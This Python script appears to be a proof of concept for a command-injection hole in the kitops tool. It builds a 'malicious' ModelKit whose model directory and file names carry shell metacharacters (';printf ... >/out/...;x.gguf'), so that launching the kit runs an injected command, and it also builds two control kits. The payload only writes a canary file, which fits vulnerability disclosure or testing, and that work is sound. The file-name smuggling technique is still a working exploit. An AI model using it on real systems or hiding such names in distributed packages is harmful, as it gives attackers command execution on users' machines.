#!/usr/bin/env python3
"""Build the attacker's ONLY capability: three ModelKit context directories.

A ModelKit is a Kitfile plus the files it references.  `kit unpack` / `kit pull`
materialise exactly this on the victim's disk, and `kit dev start <dir>` is the
documented way to try the model out.

kitops DOES validate containment: pkg/cmd/dev/dev.go:77 runs the model path
through filesystem.VerifySubpath before using it.  What it never validates is
the *content* of the resolved path, which pkg/lib/harness/llm-harness.go:102
interpolates into a shell string:

    exec.Command("sh", "-c",
      fmt.Sprintf("./llamafile --server --model %s --host %s --port %d ...", modelPath, ...))

So the attack payload is carried purely by *names inside the ModelKit*: the
resolved .gguf path is

    <ctx>/models/;printf <CANARY_TEXT> >/out/<canary>;x.gguf

which /bin/sh reads as three commands.  Every component below is a legal POSIX
filename component; none of them contains a '/'.

Three artifacts:
  evil_kit/    model file path carries shell metacharacters   (the attack)
  benign_kit/  identical Kitfile, ordinary models/model.gguf  (control A)
  nogguf_kit/  no .gguf at all, findModelFile fails           (control B)
"""
import hashlib
import json
import pathlib
import sys

CANARY_PATH = "/out/pwned_by_w11_kitops_kitfile"
CANARY_TEXT = "PWNED_BY_W11_KITOPS_KITFILE"

KITFILE = (
    'manifestVersion: "1.0.0"\n'
    "package:\n"
    "  name: %s\n"
    "  version: 1.0.0\n"
    "  description: community model kit\n"
    "model:\n"
    "  name: demo-llm\n"
    "  path: models\n"
    "  framework: gguf\n"
)

# the three path components that make /bin/sh see an extra command
INJ_DIR = ";printf %s >" % CANARY_TEXT          # legal dir name: ';printf X >'
OUT_DIR = "out"                                  # so the redirect target is /out/...
GGUF_NAME = "%s;x.gguf" % CANARY_PATH.rsplit("/", 1)[1]


def build(root: pathlib.Path, kind: str):
    root.mkdir(parents=True, exist_ok=True)
    (root / "Kitfile").write_text(KITFILE % root.name)
    models = root / "models"
    models.mkdir(parents=True, exist_ok=True)
    if kind == "evil":
        d = models / INJ_DIR / OUT_DIR
        d.mkdir(parents=True, exist_ok=True)
        (d / GGUF_NAME).write_bytes(b"GGUF\x00not-a-real-model\n")
    elif kind == "benign":
        (models / "model.gguf").write_bytes(b"GGUF\x00not-a-real-model\n")
    elif kind == "nogguf":
        (models / "README.txt").write_bytes(b"no model file here\n")


def digest_tree(root: pathlib.Path, base: pathlib.Path):
    out = {}
    for p in sorted(root.rglob("*")):
        if p.is_file():
            out[str(p.relative_to(base))] = hashlib.sha256(p.read_bytes()).hexdigest()
    return out


def main():
    outdir = pathlib.Path(sys.argv[1] if len(sys.argv) > 1 else "artifact")
    outdir.mkdir(parents=True, exist_ok=True)
    for name, kind in (("evil_kit", "evil"), ("benign_kit", "benign"),
                       ("nogguf_kit", "nogguf")):
        build(outdir / name, kind)
    digests = {}
    for name in ("evil_kit", "benign_kit", "nogguf_kit"):
        digests.update(digest_tree(outdir / name, outdir))
    (outdir / "SHA256SUMS").write_text(
        "".join(f"{v}  {k}\n" for k, v in sorted(digests.items())))
    print(json.dumps(digests, indent=2, sort_keys=True))


if __name__ == "__main__":
    main()
